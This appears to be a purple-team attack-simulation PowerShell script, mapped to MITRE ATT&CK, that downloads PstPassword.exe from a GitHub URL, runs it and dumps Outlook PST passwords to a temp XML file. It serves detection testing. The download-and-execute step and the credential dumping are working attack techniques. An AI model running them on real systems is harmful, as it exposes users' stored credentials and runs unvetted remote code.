<#
    T1588.002 - Obtain Capabilities: Tool
    T1555 - Credentials from Password Stores
    T1114.001 - Email Collection: Local Email Collection
    Extract PST passwords from Outlook PST files with Nirsoft tool PstPassword.exe
    Download PstPassword.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PstPassword.exe and execute it 
#>

param(
    #/pstpath <Folder>	
    [Parameter(Mandatory=$false)]
    [string]$folder,
    #/pstfiles <PST File 1> <PST File 2>...	Specify one or more pst files to load.
    [Parameter(Mandatory=$false)]
    [string]$file
)

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

if ($folder -and $file){
    Write-Host -ForegroundColor Red "Error: You cannot use both arguments, use either -file or -folder"
    exit 1
}

# Download and execute PstPassword.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/PstPassword.exe"
$dumpfile = "$env:tmp\pstpasswords.xml"
$outfile = "$env:tmp\pstpwd.exe"

try {
    Invoke-WebRequest $url -OutFile $outfile  -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: PstPassword.exe downloaded to $outfile"
        if (-not $file -and -not $folder){
            Write-Host -ForegroundColor Cyan "No arguments provided to the script, will use get default outlook pst folder path"
            & $outfile /sxml $dumpfile
            sleep 1
        }
        if ($folder){
            if(Test-Path $folder){
                Write-Host -ForegroundColor Cyan "Using folder `'$folder`' provided as argument"
                & $outfile /sxml $dumpfile /pstpath "$folder"
                sleep 1
            }
            else{
                Write-Host -ForegroundColor Red "Error: Folder path `'$folder`' provided as argument is not valid"
                exit 1
            }
        }
        if ($file){
            Write-Host -ForegroundColor Cyan "Using file(s) `'$file`' provided as argument"
            & $outfile /sxml $dumpfile /pstfiles "$file"
            sleep 1
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download PstPassword.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Pst passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract Pst passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
